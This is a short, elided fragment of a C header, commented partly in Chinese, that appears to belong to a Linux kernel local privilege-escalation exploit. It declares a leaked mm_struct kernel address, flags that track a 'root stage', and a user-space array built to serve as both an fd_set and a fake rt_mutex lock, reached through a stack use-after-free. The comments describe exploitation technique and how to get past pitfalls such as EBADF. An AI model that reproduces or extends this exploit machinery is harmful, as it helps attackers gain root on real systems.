...
/* backup_v1: nfds=64 只扫 word0 (pselect_user_lock[0]=0) → 无 fd → 阻塞
 * 不能用更大的 nfds, 否则 word1-3 的内核地址被解释为 fd → EBADF */
...
extern uintptr_t leaked_mm_struct;  /* KernelSnitch 泄漏的 mm_struct 地址 */
...
/* Stage-2 root gate state.  These are deliberately separate from
 * root_child_done so a route log can distinguish transport failure from a
 * root-stage entry/failure. */
extern int root_stage_entered;
extern int root_stage_transport_ok;
extern int root_stage_ok;
...
/* pselect_user_lock: 用户态 rt_mutex_base, 既是 fd_set 又是假锁结构
 * waiter->lock 通过 stack-UAF 指向此数组 */
#define PSELECT_USER_LOCK_WORDS 16
extern uint64_t pselect_user_lock[PSELECT_USER_LOCK_WORDS];
